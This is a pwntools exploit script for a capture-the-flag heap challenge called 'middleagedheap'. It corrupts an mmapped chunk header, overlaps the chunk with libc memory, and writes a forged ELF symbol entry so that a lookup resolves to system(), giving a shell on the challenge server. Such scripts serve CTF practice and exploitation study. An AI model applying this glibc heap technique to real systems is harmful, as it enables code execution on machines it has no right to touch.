#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('./middleagedheap')
pwn.context = ['kitty', '-e', 'sh', '-c']

host = pwn.args.HOST or 'chal.b01lers.com'
port = int(pwn.args.PORT or 6666)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# gdbscript = '''
# break *$rebase(0x13D3)
# continue
# break *0x7ffff7ebd735
# break *0x7ffff7ebd739
# break *0x7ffff7ebd73c
# continue
# '''.format(**locals())

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def GetOffsetStdin():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process(exe.path)
    p.sendline(pwn.cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def GetOffsetArgv():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process([exe.path, cyclic(512)])
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst

def Alloc(index, size):
    io.sendlineafter("> ", "1")
    io.sendlineafter("idx> ", "%d" % index)
    io.sendlineafter("size> ", "%d" % size)

def Free(index):
    io.sendlineafter("> ", "2")
    io.sendlineafter("idx> ", "%d" % index)

def Write(index, offset, data):
    io.sendlineafter("> ", "3")
    io.sendlineafter("idx> ", "%d" % index)
    io.sendlineafter("offset> ", "%d" % offset)
    io.sendline(data)

libc = pwn.ELF("./libc.so.6")
Elf64_Sym_System  = b""
Elf64_Sym_System += pwn.p32(0x19cdad) # st_name 0x7ffff7f8590c - 0x7ffff7df37a8 ('system' - strtab) || p/x 0x7ffff7f90555 - 0x7ffff7df67d9
Elf64_Sym_System += pwn.p8(0x12)      # st_info
Elf64_Sym_System += pwn.p8(0x00)      # st_other (the symbol hasn't been resolved)
Elf64_Sym_System += pwn.p16(0x10)     # st_shndx
Elf64_Sym_System += pwn.p64(0xdf54f)  # st_value (system)
Elf64_Sym_System += pwn.p64(0x20)     # st_size

def exploit():

    Alloc(0, 0x100000)
    #Alloc(1, 0x100000)
    Alloc(2, 0x100000)
    Free(2)
    Write(0, -8, pwn.p64(0x129000 + 2))
    Free(0)
    #Free(1)
    Alloc(0, 0x1000000)
    pwn.pause()

    Write(0, 0xfde930, pwn.p64(0x010220a044103081)) # 0x7ffff7de1940:   0x010220a044103081
    Write(0, 0xfdf0f0, pwn.p64(0xf000028c0200130e)) # 0x7ffff7de2100:   0xf000028c0200130e
    Write(0, 0xfdf218, pwn.p64(0x0000008c00000089)) # 0x7ffff7de2228:   0x0000008c00000089
    Write(0, 0xfe02e8, pwn.p64(0x7c967e3e7c93f2a0)) # 0x7ffff7de32f8:   0x7c967e3e7c93f2a0
    Write(0, 0xfe3340, Elf64_Sym_System)

exploit()

#Alloc(0, 0x100000)
#for i in range(10):
#    Write(0, 0, "A")


io.interactive()